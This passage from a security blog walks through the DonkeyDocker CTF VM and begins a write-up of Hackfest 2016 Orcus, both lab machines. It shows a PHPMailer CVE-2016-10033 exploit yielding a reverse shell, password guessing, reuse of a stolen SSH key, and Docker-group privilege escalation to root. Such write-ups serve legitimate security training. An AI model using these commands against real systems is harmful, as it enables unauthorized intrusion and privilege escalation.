<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>gobuster -u http://192.168.159.132/mailer -w /usr/share/wordlists/dirb/big.txt -q -t 20
</span><span class='line'>/.htpasswd (Status: 403)
</span><span class='line'>/.htaccess (Status: 403)
</span><span class='line'>/LICENSE (Status: 200)
</span><span class='line'>/docs (Status: 301)
</span><span class='line'>/examples (Status: 301)
</span><span class='line'>/extras (Status: 301)
</span><span class='line'>/language (Status: 301)
</span><span class='line'>/test (Status: 301)
</span></code></pre></td></tr></table></div></figure>


<p>Going to /mailer/examples/ reveals a PHPMailer installation. From the Github files, it should also have a VERSION file, so I went to <a href="http://192.168.159.132/mailer/VERSION">http://192.168.159.132/mailer/VERSION</a> and was rewarded with the version number: 5.2.16. I found a Metasploit exploit:</p>

<blockquote><p>PHPMailer versions up to and including 5.2.19 are affected by a
 vulnerability which can be leveraged by an attacker to write a file
 with partially controlled contents to an arbitrary location through
 injection of arguments that are passed to the sendmail binary. This
 module writes a payload to the web root of the webserver before then
 executing it with an HTTP request. The user running PHPMailer must
 have write access to the specified WEB_ROOT directory and successful
 exploitation can take a few minutes.</p></blockquote>

<p>This one didn&rsquo;t work for me, so I found another one with <a href="https://www.exploit-db.com/exploits/40974">searchsploit</a>. To make it work, I had to install requests_toolbelt and delete the banner that was giving an encoding error. Inside the code I changed the IP and port in the payload and added the target URL:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">target</span> <span class="o">=</span> <span class="s">&#39;http://192.168.159.132/contact&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Per the <a href="https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html">advisory</a>:</p>

<blockquote><p>To exploit the vulnerability an attacker could target common website
components such as contact/feedback forms, registration forms, password
email resets and others that send out emails with the help of a vulnerable
version of the PHPMailer class.</p></blockquote>

<p>After finishing the modifications, I ran it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com
</span><span class='line'>Version 1.0 - github.com/anarcoder - greetings opsxcq & David Golunski
</span><span class='line'>
</span><span class='line'>[+] SeNdiNG eVIl SHeLL To TaRGeT....
</span><span class='line'>[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D</span></code></pre></td></tr></table></div></figure>


<p>With a listener on, I went to <a href="http://192.168.159.132/backdoor">http://192.168.159.132/backdoor</a> and got a reverse shell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 9000
</span><span class='line'>listening on [any] 9000 ...
</span><span class='line'>connect to [192.168.159.129] from (UNKNOWN) [192.168.159.132] 50930
</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
</span><span class='line'>$ python -c 'import pty; pty.spawn("/bin/bash")'
</span><span class='line'>www-data@12081bd067cc:/www$</span></code></pre></td></tr></table></div></figure>


<p>From the hostname, we seem to be inside a Docker container. In the root directory I found a script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@12081bd067cc:/www$ cat /main.sh
</span><span class='line'>cat /main.sh
</span><span class='line'>#!/bin/bash
</span><span class='line'>
</span><span class='line'># change permission
</span><span class='line'>chown smith:users /home/smith/flag.txt
</span><span class='line'>
</span><span class='line'># Start apache
</span><span class='line'>source /etc/apache2/envvars
</span><span class='line'>a2enmod rewrite
</span><span class='line'>apachectl -f /etc/apache2/apache2.conf
</span><span class='line'>
</span><span class='line'>sleep 3
</span><span class='line'>tail -f /var/log/apache2/*&
</span><span class='line'>
</span><span class='line'># Start our fake smtp server
</span><span class='line'>python -m smtpd -n -c DebuggingServer localhost:25</span></code></pre></td></tr></table></div></figure>


<p>Interesting, there is a flag available for user smith. I switched to this user and tried the password smith and it worked:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smith@12081bd067cc:~$ ls -al
</span><span class='line'>ls -al
</span><span class='line'>total 28
</span><span class='line'>drwx------ 1 smith users 4096 Mar 26  2017 .
</span><span class='line'>drwxr-xr-x 1 root  root  4096 Mar 26  2017 ..
</span><span class='line'>-rw-r--r-- 1 smith users  220 Nov  5  2016 .bash_logout
</span><span class='line'>-rw-r--r-- 1 smith users 3515 Nov  5  2016 .bashrc
</span><span class='line'>-rw-r--r-- 1 smith users  675 Nov  5  2016 .profile
</span><span class='line'>drwx--S--- 2 smith users 4096 Mar 22  2017 .ssh
</span><span class='line'>-rw-r--r-- 1 smith users  237 Mar 22  2017 flag.txt
</span><span class='line'>smith@12081bd067cc:~$ cat flag.txt
</span><span class='line'>cat flag.txt
</span><span class='line'>This is not the end, sorry dude. Look deeper!
</span><span class='line'>I know nobody created a user into a docker
</span><span class='line'>container but who cares? ;-)
</span><span class='line'>
</span><span class='line'>But good work!
</span><span class='line'>Here a flag for you: flag0{9fe3ed7d67635868567e290c6a490f8e}
</span><span class='line'>
</span><span class='line'>PS: I like 1984 written by George ORWELL</span></code></pre></td></tr></table></div></figure>


<p>Inside smith&rsquo;s home we also have a .ssh folder. Inside we have a pair of private-public keys.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rwx------ 1 smith users  411 Mar 22  2017 id_ed25519
</span><span class='line'>-rwx------ 1 smith users  101 Mar 22  2017 id_ed25519.pub
</span><span class='line'>smith@12081bd067cc:~/.ssh$ cat id_ed25519.pub
</span><span class='line'>cat id_ed25519.pub
</span><span class='line'>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEBBzcffpLILgXqY77+z7/Awsovz/jkhOd/0fDjvEof orwell@donkeydocker</span></code></pre></td></tr></table></div></figure>


<p>And the SSH user is orwell. So let&rsquo;s copy the private key to our machine and try to SSH in as orwell:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh -i id_ed25519 orwell@192.168.159.132
</span><span class='line'>Welcome to
</span><span class='line'>
</span><span class='line'>  ___           _            ___          _
</span><span class='line'> |   \ ___ _ _ | |_____ _  _|   \ ___  __| |_____ _ _
</span><span class='line'> | |) / _ \ ' \| / / -_) || | |) / _ \/ _| / / -_) '_|
</span><span class='line'> |___/\___/_||_|_\_\___|\_, |___/\___/\__|_\_\___|_|
</span><span class='line'>                        |__/
</span><span class='line'>                             Made with &lt;3 v.1.0 - 2017
</span><span class='line'>
</span><span class='line'>This is my first boot2root - CTF VM. I hope you enjoy it.
</span><span class='line'>if you run into any issue you can find me on Twitter: @dhn_
</span><span class='line'>or feel free to write me a mail to:
</span><span class='line'>
</span><span class='line'> - Email: dhn@zer0-day.pw
</span><span class='line'> - GPG key: 0x2641123C
</span><span class='line'> - GPG fingerprint: 4E3444A11BB780F84B58E8ABA8DD99472641123C
</span><span class='line'>
</span><span class='line'>Level:       I think the level of this boot2root challange
</span><span class='line'>             is hard or intermediate.
</span><span class='line'>
</span><span class='line'>Try harder!: If you are confused or frustrated don't forget
</span><span class='line'>             that enumeration is the key!
</span><span class='line'>
</span><span class='line'>Thanks:      Special thanks to @1nternaut for the awesome
</span><span class='line'>             CTF VM name!
</span><span class='line'>
</span><span class='line'>Feedback:    This is my first boot2root - CTF VM, please
</span><span class='line'>             give me feedback on how to improve!
</span><span class='line'>
</span><span class='line'>Looking forward to the write-ups!
</span><span class='line'>
</span><span class='line'>donkeydocker:~$</span></code></pre></td></tr></table></div></figure>


<p>It worked! In orwell&rsquo;s home we find another flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ ls -al /home/orwell
</span><span class='line'>total 24
</span><span class='line'>drwxr-sr-x    3 orwell   orwell        4096 Mar 26  2017 .
</span><span class='line'>drwxr-xr-x    3 root     root          4096 Mar 22  2017 ..
</span><span class='line'>-rw-r--r--    1 root     orwell           1 Mar 26  2017 .ash
</span><span class='line'>-rw-------    1 orwell   orwell          45 Apr 15 18:12 .ash_history
</span><span class='line'>drwx--S---    2 orwell   users         4096 Mar 22  2017 .ssh
</span><span class='line'>-rw-r--r--    1 orwell   orwell         104 Mar 22  2017 flag.txt
</span><span class='line'>donkeydocker:~$ cat flag.txt
</span><span class='line'>You tried harder! Good work ;-)
</span><span class='line'>
</span><span class='line'>Here a flag for your effort: flag01{e20523853d6733721071c2a4e95c9c60}</span></code></pre></td></tr></table></div></figure>


<p>Now we seem to be on the Docker host itself. Let&rsquo;s confirm:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ docker ps
</span><span class='line'>CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
</span><span class='line'>12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 4 hours          0.0.0.0:80-&gt;80/tcp   donkeydocker</span></code></pre></td></tr></table></div></figure>


<p>We can see the container we were in previously. Now, for the next step, I used as reference this blog post about <a href="https://fosterelli.co/privilege-escalation-via-docker.html">Docker privilege escalation</a>. The highlights are :</p>

<blockquote><p>If you happen to have gotten access to a user-account on a machine, and that user is a member of the ‘docker’ group, running the following command will give you a root shell:
docker run -v /:/hostOS -i -t chrisfosterelli/rootplease</p>

<p>The command you run to perform the privilege escalation fetches my Docker image from the Docker Hub Registry and runs it. The -v parameter that you pass to Docker specifies
that you want to create a volume in the Docker instance. The -i and -t parameters put Docker into ‘shell mode’ rather than starting a daemon process.</p>

<p>The instance is set up to mount the root filesystem of the host machine to the instance’s volume, so when the instance starts it immediately loads a chroot into that volume.
This effectively gives you root on the machine.</p></blockquote>

<p>And if we look at the groups that orwell is a part of, we can see that he is indeed a member of the docker group:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ id
</span><span class='line'>uid=1000(orwell) gid=1000(orwell) groups=101(docker),1000(orwell)</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s look at the available containers now:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ docker container ls
</span><span class='line'>CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
</span><span class='line'>12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 32 minutes       0.0.0.0:80-&gt;80/tcp   donkeydocker</span></code></pre></td></tr></table></div></figure>


<p>We can create a new container in the background which is based on the donkeydocker one and mount the host filesystem in it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ docker run -d -v /:/host donkeydocker
</span><span class='line'>103cd9c625b0cf04e1ed173d95e56724051a708300a07d75c20618472eefe863</span></code></pre></td></tr></table></div></figure>


<p>Now we should find the host / contents in the /host directory inside the container. Let&rsquo;s verify that it was created:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ docker container ls
</span><span class='line'>CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES
</span><span class='line'>103cd9c625b0        donkeydocker        "/main.sh default"   4 seconds ago       Up 3 seconds        80/tcp               epic_lovelace
</span><span class='line'>12081bd067cc        donkeydocker        "/main.sh default"   2 years ago         Up 34 minutes       0.0.0.0:80-&gt;80/tcp   donkeydocker</span></code></pre></td></tr></table></div></figure>


<p>And now we can run a root shell inside the container and read the host flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>donkeydocker:~$ docker exec -i -t 103cd9c625b0 /bin/bash
</span><span class='line'>root@103cd9c625b0:/# ls /host/root
</span><span class='line'>donkeydocker  flag.txt
</span><span class='line'>root@103cd9c625b0:/# cat /host/root/flag.txt
</span><span class='line'>YES!! You did it :-). Congratulations!
</span><span class='line'>
</span><span class='line'>I hope you enjoyed this CTF VM.
</span><span class='line'>
</span><span class='line'>Drop me a line on twitter @dhn_, or via email dhn@zer0-day.pw
</span><span class='line'>
</span><span class='line'>Here is your flag: flag2{60d14feef575bacf5fd8eb06ec7cd8e7}</span></code></pre></td></tr></table></div></figure>


<p>Nice Docker twist on this VM! To recap the steps:</p>

<ul>
<li>Web directory enumeration revealed a vulnerable PHPMailer installation that gave a shell as the www-data</li>
<li>the shell was inside a docker container. A script placed in the root filesystem revealed a smith user that had the username as password</li>
<li>the smith user had the SSH keys for a user orwell on the host and we were able to SSH directly as that user with the private key</li>
<li>user orwell was member of the docker group and it was possible to escalate privileges by mounting the root filesystem inside a container</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>______________________________________
</span><span class='line'>/ Your motives for doing whatever good \
</span><span class='line'>| deed you may have in mind will be    |
</span><span class='line'>\ misinterpreted by somebody.          /
</span><span class='line'> --------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hackfest 2016 Orcus]]></title>
    <link href="http://chousensha.github.io/blog/2019/04/07/hackfest-2016-orcus/"/>
    <updated>2019-04-07T22:20:06+03:00</updated>
    <id>http://chousensha.github.io/blog/2019/04/07/hackfest-2016-orcus</id>
    <content type="html"><![CDATA[<p>Today&rsquo;s VM is the third machine in the Hackfest series:</p>

<blockquote><p>This is a vulnerable machine i created for the Hackfest 2016 CTF <a href="http://hackfest.ca/">http://hackfest.ca/</a></p>

<p>Difficulty : Hard</p>

<p>Tips:</p>

<p>If youre stuck enumerate more! Seriously take each service running on the system and enumerate them more!</p>

<p>Goals: This machine is intended to take a lot of enumeration and understanding of Linux system.</p>

<p>There are 4 flags on this machine 1. Get a shell 2. Get root access 3. There is a post exploitation flag on the box 4. There is something on
this box that is different from the others from this series (Quaoar and Sedna) find why its different</p></blockquote>

<!-- more -->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey:
</span><span class='line'>|   2048 3a:48:6e:8e:3f:32:26:f8:b6:a1:c6:b1:70:73:37:75 (RSA)
</span><span class='line'>|   256 04:55:e6:48:50:d6:93:d7:12:80:a0:68:bc:97:fa:33 (ECDSA)
</span><span class='line'>|_  256 c9:a9:c9:0d:df:7c:fc:a7:da:87:ef:d3:38:c3:f2:a6 (ED25519)
</span><span class='line'>53/tcp    open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)
</span><span class='line'>| dns-nsid:
</span><span class='line'>|_  bind.version: 9.10.3-P4-Ubuntu
</span><span class='line'>80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
</span><span class='line'>| http-robots.txt: 30 disallowed entries (15 shown)
</span><span class='line'>| /exponent.js.php /exponent.js2.php /exponent.php
</span><span class='line'>| /exponent_bootstrap.php /exponent_constants.php /exponent_php_setup.php
</span><span class='line'>| /exponent_version.php /getswversion.php /login.php /overrides.php
</span><span class='line'>| /popup.php /selector.php /site_rss.php /source_selector.php
</span><span class='line'>|_/thumb.php
</span><span class='line'>|_http-server-header: Apache/2.4.18 (Ubuntu)
</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
</span><span class='line'>110/tcp   open  pop3        Dovecot pop3d
</span><span class='line'>|_pop3-capabilities: AUTH-RESP-CODE CAPA UIDL SASL RESP-CODES STLS PIPELINING TOP
</span><span class='line'>|_ssl-date: TLS randomness does not represent time
</span><span class='line'>111/tcp   open  rpcbind     2-4 (RPC #100000)
</span><span class='line'>| rpcinfo:
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
</span><span class='line'>|   100003  2,3,4       2049/tcp  nfs
</span><span class='line'>|   100003  2,3,4       2049/udp  nfs
</span><span class='line'>|   100005  1,2,3      36199/tcp  mountd
</span><span class='line'>|   100005  1,2,3      38727/udp  mountd
</span><span class='line'>|   100021  1,3,4      41463/tcp  nlockmgr
</span><span class='line'>|   100021  1,3,4      43317/udp  nlockmgr
</span><span class='line'>|   100227  2,3         2049/tcp  nfs_acl
</span><span class='line'>|_  100227  2,3         2049/udp  nfs_acl
</span><span class='line'>139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
</span><span class='line'>143/tcp   open  imap        Dovecot imapd
</span><span class='line'>|_imap-capabilities: have more SASL-IR OK LOGIN-REFERRALS ENABLE capabilities Pre-login LOGINDISABLEDA0001 STARTTLS IDLE listed ID LITERAL+ IMAP4rev1 post-login
</span><span class='line'>|_ssl-date: TLS randomness does not represent time
</span><span class='line'>443/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey:
</span><span class='line'>|   2048 3a:48:6e:8e:3f:32:26:f8:b6:a1:c6:b1:70:73:37:75 (RSA)
</span><span class='line'>|   256 04:55:e6:48:50:d6:93:d7:12:80:a0:68:bc:97:fa:33 (ECDSA)
</span><span class='line'>|_  256 c9:a9:c9:0d:df:7c:fc:a7:da:87:ef:d3:38:c3:f2:a6 (ED25519)
</span><span class='line'>445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
</span><span class='line'>993/tcp   open  ssl/imaps?
</span><span class='line'>|_ssl-date: TLS randomness does not represent time
</span><span class='line'>995/tcp   open  ssl/pop3s?
</span><span class='line'>|_ssl-date: TLS randomness does not represent time
</span><span class='line'>2049/tcp  open  nfs_acl     2-3 (RPC #100227)
</span><span class='line'>36199/tcp open  mountd      1-3 (RPC #100005)
</span><span class='line'>41463/tcp open  nlockmgr    1-4 (RPC #100021)
</span><span class='line'>54301/tcp open  mountd      1-3 (RPC #100005)
</span><span class='line'>54471/tcp open  mountd      1-3 (RPC #100005)</span></code></pre></td></tr></table></div></figure>


<p>The web server greets us with a familiar planet image. In the background, I started some Samba enumeration, but didn&rsquo;t find anything interesting:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>smbmap -H 192.168.159.131
</span><span class='line'>[+] Finding open SMB ports....
</span><span class='line'>[+] Guest SMB session established on 192.168.159.131...
</span><span class='line'>[+] IP: 192.168.159.131:445   Name: 192.168.159.131
</span><span class='line'>  Disk                                                    Permissions
</span><span class='line'>  ----                                                    -----------
</span><span class='line'>  print$                                              NO ACCESS
</span><span class='line'>  IPC$                                                NO ACCESS</span></code></pre></td></tr></table></div></figure>


<p>I prefer to leave the web server for last when there are more vectors available, so before further poking at it, I also checked the if something is shared via the NFS:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>showmount -e 192.168.159.131
</span><span class='line'>Export list for 192.168.159.131:
</span><span class='line'>/tmp *</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what we have there:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mount -t nfs 192.168.159.131:/tmp /mnt
</span><span class='line'>root@deck:/mnt# ls -alh
</span><span class='line'>total 76K
</span><span class='line'>drwxrwxrwt 10 root root 4.0K Apr  3  2019 .
</span><span class='line'>drwxr-xr-x 19 root root  36K Mar 15 08:27 ..
</span><span class='line'>drwxrwxrwt  2 root root 4.0K Apr  3  2019 .font-unix
</span><span class='line'>drwxrwxrwt  2 root root 4.0K Apr  3  2019 .ICE-unix
</span><span class='line'>drwx------  3 root root 4.0K Apr  3  2019 systemd-private-86f79ff31b254446ada5e9ff21595778-dovecot.service-SEiaO9
</span><span class='line'>drwx------  3 root root 4.0K Apr  3  2019 systemd-private-86f79ff31b254446ada5e9ff21595778-systemd-timesyncd.service-2AJ3nv
</span><span class='line'>drwxrwxrwt  2 root root 4.0K Apr  3  2019 .Test-unix
</span><span class='line'>drwx------  2 root root 4.0K Apr  3  2019 vmware-root
</span><span class='line'>drwxrwxrwt  2 root root 4.0K Apr  3  2019 .X11-unix
</span><span class='line'>drwxrwxrwt  2 root root 4.0K Apr  3  2019 .XIM-unix</span></code></pre></td></tr></table></div></figure>


<p>I looked around, but didn&rsquo;t find anything to continue from, so back to the web server!</p>

<p>Nmap reported lots of entries in the robots.txt file, so let&rsquo;s have a look:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User-agent: *
</span><span class='line'>Crawl-delay: 5
</span><span class='line'># @@@@@@   @@@@@@@    @@@@@@@  @@@  @@@   @@@@@@
</span><span class='line'>#@@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@  @@@@@@@
</span><span class='line'>#@@!  @@@  @@!  @@@  !@@       @@!  @@@  !@@
</span><span class='line'>#!@!  @!@  !@!  @!@  !@!       !@!  @!@  !@!
</span><span class='line'>#@!@  !@!  @!@!!@!   !@!       @!@  !@!  !!@@!!
